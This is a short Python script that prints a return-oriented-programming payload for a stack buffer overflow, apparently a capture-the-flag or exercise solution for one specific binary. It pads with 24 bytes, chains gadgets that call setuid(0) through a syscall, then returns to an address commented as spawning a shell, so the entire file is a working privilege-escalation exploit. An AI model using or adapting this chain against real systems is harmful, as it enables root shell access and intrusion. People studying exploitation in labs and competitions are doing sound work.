#!/usr/bin/env python3

import sys
sys.stdout.buffer.write(b"\x41" * 24)
# pop rax; ret
sys.stdout.buffer.write(0x0000000000448857.to_bytes(8, "little"))
sys.stdout.buffer.write(0x69.to_bytes(8, "little"))
# pop rdi; ret
sys.stdout.buffer.write(0x0000000000401fef.to_bytes(8, "little"))
sys.stdout.buffer.write(0x0.to_bytes(8, "little"))
# syscall; ret
sys.stdout.buffer.write(0x0000000000414fa6.to_bytes(8, "little"))
# return to shell
sys.stdout.buffer.write(0x0000000000401898.to_bytes(8, "little"))